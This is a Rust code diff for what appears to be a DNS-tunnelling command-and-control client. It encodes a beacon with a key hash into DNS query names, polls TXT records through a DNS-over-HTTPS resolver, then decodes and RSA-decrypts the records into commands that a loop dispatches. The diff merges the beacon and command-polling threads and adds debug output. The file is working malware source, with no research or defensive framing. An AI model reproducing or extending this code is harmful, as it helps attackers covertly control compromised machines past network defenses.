@@ -145,13 +145,14 @@ fn handleKeyGeneration(domain: &str, serverPublicKey: &str) -> (String, RsaPriva
 use std::{thread, time};
  
 fn parseDNSTextEntry(response: &str) -> String{
-    let re = Regex::new(r"(?<==)(.*?)\\").unwrap();
+    let re = Regex::new(r"(?<=dv=)(.*?)\\").unwrap();
     let mut result = String::new();
     
     let mut captures_iter = re.captures_iter(response);
     for x in captures_iter{
         let mut data = x.unwrap().get(0).unwrap().as_str();
         data = data.trim_end_matches("\\");
+        println!("Regex! {}", &data);
         result.push_str(&data);
     }
     return result.clone()
@@ -163,47 +164,90 @@ fn is_base32(s: &str) -> bool {
     if decode.is_some(){
         return true
     }
+    if decode.is_none(){
+        return false
+    }
     return false
 }
 
-fn checkDNSTextEntry<'a>(domain: &str, private_key_internal: &RsaPrivateKey) -> Vec<String>{
+fn checkDNSTextEntry<'a>(domain: &str, private_key_internal: &RsaPrivateKey, public_key_hash: &str) -> Vec<String>{
+    let mFormat: String = format!("2|{}", public_key_hash);
+    let base32Data = base32::encode(
+        Alphabet::RFC4648 { padding: true },
+        &mFormat.as_bytes()
+    );
+    let dnsMAX = 255;
+    let dnsdomainNameSize = domain.len();
+    let maxDNSData = dnsMAX - dnsdomainNameSize;
+    let mut packetOrder = 0;
+    let messageSize = base32Data.len();
+    let mut messageRemainSize = messageSize;
+    let mut lastPacket = 0;
+    let mut result = String::new();
+
+    for (i, c) in base32Data.chars().enumerate() {
+        if i % 61 == 0 && i != 0{
+            result.push('.');
+        }
+        if (result.len() >= (maxDNSData - dnsdomainNameSize)){
+            packetOrder += 1;
+            let s = format!("-{}-{}-", packetOrder, result.len());
+            result.push_str(&s);
+            result.push('.');
+            result.push_str(domain);
+            lastPacket = 1;
+        }
+        result.push(c);
+    }
+    if lastPacket == 1 || result.len() < 255{
+        packetOrder += 1;
+        let s = format!("-{}-{}-_", packetOrder, result.len());
+        result.push_str(&s);
+        result.push('.');
+        result.push_str(domain);
+        lastPacket = 0;
+    }
+
+    println!("Ping encoded :: {}", &result);
     println!("Checking TXT entry");
+
     let mut url = Url::parse("https://1.1.1.1/dns-query").unwrap();
     url.query_pairs_mut()
-        .append_pair("name", domain)
+        .append_pair("name", &result)
         .append_pair("type", "TXT");
     let client = reqwest::blocking::Client::new();
     let mut request = client.get(url.as_str()).header("accept", "application/dns-json").send();
     let mut response = request.unwrap();
     let mut data = response.text().unwrap();
 
-    data = parseDNSTextEntry(&data);
-    if !is_base32(&data){
-        let commandDecoded = &base64::decode(data);
-        match commandDecoded{
-            Ok(commandDecoded) => {
-                println!("Data :: {:?}", &commandDecoded);
-                let padding = Oaep::new::<sha2::Sha256>();
-                let dec_data = private_key_internal.decrypt(padding, &commandDecoded);
-                match dec_data{
-                    Ok(dec_data) =>{
-                        let utf_data = String::from_utf8(dec_data).unwrap();
-                        let new_string: String = utf_data.to_owned();
-                        let parts: Vec<String> = new_string.split('|').map(|s| s.to_string()).collect();
-                        println!("Data {:?}", &parts);
-                        return parts;
-                    }
-                    Err(err)=>{
-                        println!("{}", err);
-                        return vec![]
-                    }
-                }
+    result.clear();
+
+
+    println!("Data before regex {}", &data);
+    let mut ndata = parseDNSTextEntry(&data);
+    println!("Data after regex {}", &ndata);
+
+    let bFlag = is_base32(&ndata);
+    if bFlag == false{
+        let commandDecoded = &base64::decode(ndata).unwrap();
+        println!("Decoded {:?}", &commandDecoded);
+        let padding = Oaep::new::<sha2::Sha256>();
+        let dec_data = private_key_internal.decrypt(padding, &commandDecoded);
+        match dec_data{
+            Ok(dec_data) =>{
+                let utf_data = String::from_utf8(dec_data).unwrap();
+                let new_string: String = utf_data.to_owned();
+                let parts: Vec<String> = new_string.split('|').map(|s| s.to_string()).collect();
+                println!("Data {:?}", &parts);
+                return parts;
             }
-            Err(_) =>{
+            Err(err)=>{
+                println!("Error! {}", err);
                 return vec![]
             }
         }
     }
+    ndata.clear();
     return vec![];
 }
 
@@ -221,7 +265,7 @@ fn commandServerHandler(domain: &str, public_key_external: &RsaPublicKey, public
             while true{
                 let mut stime = mutex.lock().unwrap();
                 let ten_millis = time::Duration::from_millis(*stime);
-                let command = checkDNSTextEntry(&domain, &private_key_internal);
+                let command = checkDNSTextEntry(&domain, &private_key_internal, &public_key_hash);
                 if !command.is_empty(){
                     match command.get(1).unwrap().as_str() {
                         "a" => println!("o segundo elemento é um!"),
@@ -243,30 +287,6 @@ fn commandServerHandler(domain: &str, public_key_external: &RsaPublicKey, public
 }
 
 
-fn pingServerHandler(domain: &str, public_key_hash: &str){
-    unsafe {
-        let s: String = format!("2|{}", public_key_hash);
-        if let Some(ref mutex) = SleepTime {
-            while true{
-                let mut stime = mutex.lock();
-                match stime{
-                    Ok(stime) =>{
-                        let ten_millis = time::Duration::from_millis(*stime);
-                        std::mem::drop(stime);
-                        dnsRequestEncoder(domain, &s);
-                        thread::sleep(ten_millis);
-                    }
-                    Err(err)=>{
-                        println!("{}", err);
-                        continue;
-                    }
-                }
-            }
-        }
-    }
-}
-
-
 use std::time::Duration;
 #[allow(unused_variables)]
 fn serverHandler(domain: &str, public_key_external: RsaPublicKey, public_key_hash: &str, private_key_internal: &RsaPrivateKey){
@@ -280,14 +300,14 @@ fn serverHandler(domain: &str, public_key_external: RsaPublicKey, public_key_has
 
     println!("ping server");
     thread::spawn(move || {
-        pingServerHandler(&domain_clone, &public_key_hash_clone);
+        commandServerHandler(&domain_clone, &public_key_external_clone, &public_key_hash_clone, &private_key_clone);
     });
 
-    let domain_clone2 = domain.to_string();
-    let public_key_hash_clone2 = public_key_hash.to_string();
-    thread::spawn(move || {
-        commandServerHandler(&domain_clone2, &public_key_external_clone, &public_key_hash_clone2, &private_key_clone);
-    });
+    //let domain_clone2 = domain.to_string();
+    //let public_key_hash_clone2 = public_key_hash.to_string();
+    //thread::spawn(move || {
+    //    commandServerHandler(&domain_clone2, &public_key_external_clone, &public_key_hash_clone2, &private_key_clone);
+    //});
 
     loop {
         thread::sleep(Duration::from_secs(1));
